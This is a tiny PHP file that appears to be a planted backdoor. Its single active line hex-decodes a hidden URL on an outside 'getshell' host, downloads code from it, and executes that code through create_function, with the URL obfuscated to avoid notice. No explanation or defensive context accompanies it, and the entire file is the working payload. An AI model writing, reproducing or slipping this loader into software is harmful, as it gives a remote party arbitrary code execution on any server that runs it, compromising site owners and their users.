<?php 
  define('iphp','oday');
  array_filter(array(null),create_function(null, pack('H*',file_get_contents(pack('H*','687474703a2f2f6765747368656c6c2e6865696c6979752e636f6d2f676574636f64652e7068703f63616c6c3d636f6465')))));